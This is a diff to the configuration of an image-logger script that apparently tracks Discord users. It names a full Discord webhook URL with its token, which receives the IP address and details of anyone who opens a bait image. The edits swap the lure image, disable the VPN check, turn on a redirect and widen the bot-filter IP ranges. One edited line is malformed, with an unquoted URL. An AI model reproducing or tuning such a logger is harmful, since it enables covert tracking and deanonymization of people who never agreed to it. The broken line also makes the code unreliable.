@@ -11,7 +11,7 @@ __author__ = "idontlikeexpiredmilk"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1464393570696954045/6b8wZpN9zOTif2Wf1IB5VB-gU6xOdOnwWn7G2bhJR1PGGbOslIIOtIGlcKKHbjteEPpZ",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://blogcdn.namehero.com/blog/wp-content/uploads/2025/05/07105620/a9f7beaa-688b-4b62-b766-dae34408b0e0.png?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -30,13 +30,13 @@ config = {
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 0, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -48,8 +48,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": https://blogcdn.namehero.com/blog/wp-content/uploads/2025/05/07105620/a9f7beaa-688b-4b62-b766-dae34408b0e0.png "" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -65,7 +65,7 @@ blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a 
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
+    if ip.startswith(("34", "35", "10", "192", "172", "169")):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
